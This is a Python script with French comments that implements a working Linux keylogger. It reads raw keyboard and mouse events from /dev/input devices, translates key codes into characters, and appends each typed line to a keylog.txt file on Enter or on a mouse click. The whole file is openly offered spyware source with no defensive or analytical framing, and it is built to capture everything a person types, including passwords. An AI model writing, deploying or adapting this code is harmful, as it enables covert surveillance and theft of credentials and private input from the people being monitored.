import os
import struct
import time

# Définir les chemins vers les fichiers d'événements (événements clavier et souris)
keyboard_device_path = '/dev/input/event3'  # Modifier selon votre configuration
mouse_device_path = '/dev/input/event4'     # Modifier selon votre configuration

# Fichier de log
log_file_path = '/Musique/keylog.txt'  # Modifier avec un chemin valide

# Buffer pour stocker les frappes
buffer = []

# Fonction pour écrire le buffer dans le fichier
def write_buffer():
    if buffer:  # Vérifie s'il y a du contenu à écrire
        with open(log_file_path, 'a') as log_file:
            log_file.write(''.join(buffer) + '\n')  # Écrire les frappes dans le fichier
        buffer.clear()  # Vider le buffer après l'écriture

# Fonction pour écouter les frappes du clavier
def listen_keyboard():
    with open(keyboard_device_path, 'rb') as device:
        while True:
            # Lire les données des événements (24 octets)
            data = device.read(24)
            if not data:
                continue

            # Extraire les événements (temps, type d'événement, code, valeur)
            (tv_sec, tv_usec, ev_type, code, value) = struct.unpack('llHHI', data)

            # Filtrer pour les événements de touches
            if ev_type == 1:  # EV_KEY
                if value == 1:  # Key press (frappe)
                    if code == 28:  # Code de la touche 'Enter'
                        write_buffer()  # Écrire le buffer lorsque 'Enter' est pressée
                    else:
                        buffer.append(get_key_from_code(code))  # Ajouter la frappe au buffer

# Fonction pour écouter les clics de souris
def listen_mouse():
    with open(mouse_device_path, 'rb') as device:
        while True:
            # Lire les données des événements de la souris (24 octets)
            data = device.read(24)
            if not data:
                continue

            # Extraire les événements (temps, type d'événement, code, valeur)
            (tv_sec, tv_usec, ev_type, code, value) = struct.unpack('llHHI', data)

            # Filtrer pour les événements de clic de souris (type EV_KEY)
            if ev_type == 1 and value == 1:  # Mouse click (clic appuyé)
                write_buffer()  # Écrire le buffer sur un clic de souris

# Fonction pour obtenir le caractère à partir du code de touche
def get_key_from_code(code):
    key_map = {
        2: '1', 3: '2', 4: '3', 5: '4', 6: '5',
        7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
        12: '-', 13: '=', 14: '[Backspace]', 15: '[Tab]',
        16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't',
        21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
        26: '[', 27: ']', 28: '[Enter]', 29: '[Ctrl]',
        30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g',
        35: 'h', 36: 'j', 37: 'k', 38: 'l', 39: ';',
        40: "'", 41: '`', 42: '[Shift]', 43: '\\',
        44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b',
        49: 'n', 50: 'm', 51: ',', 52: '.', 53: '/',
        57: ' '
    }
    return key_map.get(code, '[Unknown]')

# Démarrer l'écoute des frappes et des clics
def main():
    import threading
    # Démarrer deux threads, un pour le clavier et un pour la souris
    keyboard_thread = threading.Thread(target=listen_keyboard)
    mouse_thread = threading.Thread(target=listen_mouse)

    keyboard_thread.start()
    mouse_thread.start()

    keyboard_thread.join()
    mouse_thread.join()

if __name__ == "__main__":
    main()
